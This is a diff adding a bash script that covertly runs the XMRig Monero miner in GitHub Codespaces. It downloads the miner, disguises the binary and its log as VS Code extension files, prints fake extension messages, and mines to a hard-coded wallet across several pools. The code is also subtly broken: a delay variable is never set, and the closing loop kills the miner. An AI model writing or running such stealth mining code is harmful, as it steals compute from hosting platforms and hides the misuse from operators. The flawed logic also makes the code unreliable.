@@ -1,0 +1,85 @@
+#!/bin/bash
+
+# Ultra-Stealth XMRig Runner for GitHub Codespaces
+# Note: This violates GitHub ToS - for educational purposes only
+
+# Configuration
+WALLET="43ihxdg6U74LfU1aYnB2f3W6bMtNpkrBLPuhDUJT2QYJ87ax8jxuHUPDad4fH2UmcK9YJah5wjJCmS7cMoFf8zkF7e5ArBb"  # Replace with your wallet
+WORKER="vscode-$(hostname|md5sum|cut -c1-8)"
+POOL_LIST=(
+    "monero.hashvault.pro:443"
+    "xmrpool.eu:9999"
+    "mine.xmrpool.net:443"
+    "pool.supportxmr.com:5555"
+)
+
+# Stealth Settings
+STEALTH_DIR="$HOME/.vscode-server/extensions"
+BINARY_NAME="node_modules_helper"
+LOG_FILE="/tmp/vscode-extension.log"
+
+# Cleanup function
+cleanup() {
+    pkill -f "$BINARY_NAME" 2>/dev/null
+    rm -f "$LOG_FILE" 2>/dev/null
+    echo "[vscode] Extension host terminated"
+    exit 0
+}
+trap cleanup EXIT TERM INT
+
+download_miner() {
+    echo "[vscode] Downloading extension dependencies..."
+    mkdir -p "$STEALTH_DIR"
+    cd "$STEALTH_DIR" || return 1
+
+    # Download small, pre-built static binary
+    curl -sL "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz" | \
+    tar xz --strip-components=1 -C . 2>/dev/null
+
+    # Rename and make executable
+    mv xmrig "$BINARY_NAME"
+    chmod +x "$BINARY_NAME"
+}
+
+# Start mining quietly
+start_mining() {
+    echo "[vscode] Initializing extensions ($DELAY seconds delay)..."
+    sleep "$DELAY"
+    
+    cd "$STEALTH_DIR" || return 1
+    
+    # Select random pool
+    POOL=${POOL_LIST[$RANDOM % ${#POOL_LIST[@]}]}
+    
+    # Run with lowest priority
+    nohup nice -n 19 ./"$BINARY_NAME" \
+        -o "$POOL" \
+        -u "$WALLET" \
+        -p "$WORKER" \
+        --tls \
+        --donate-level=0 \
+        --cpu-max-threads-hint=40 \
+        --randomx-mode=fast \
+        --no-color \
+        --background \
+        > "$LOG_FILE" 2>&1 &
+}
+
+# Main execution
+if [ -f "$STEALTH_DIR/$BINARY_NAME" ]; then
+    start_mining
+else
+    if download_miner; then
+        start_mining
+    else
+        echo "[vscode] Extension dependency download failed"
+        exit 1
+    fi
+fi
+
+# Continuous stealth monitoring
+while true; do
+    sleep $((RANDOM % 3600 + 1800))  # 30-90 minute intervals
+    cleanup
+    exit 0
+done
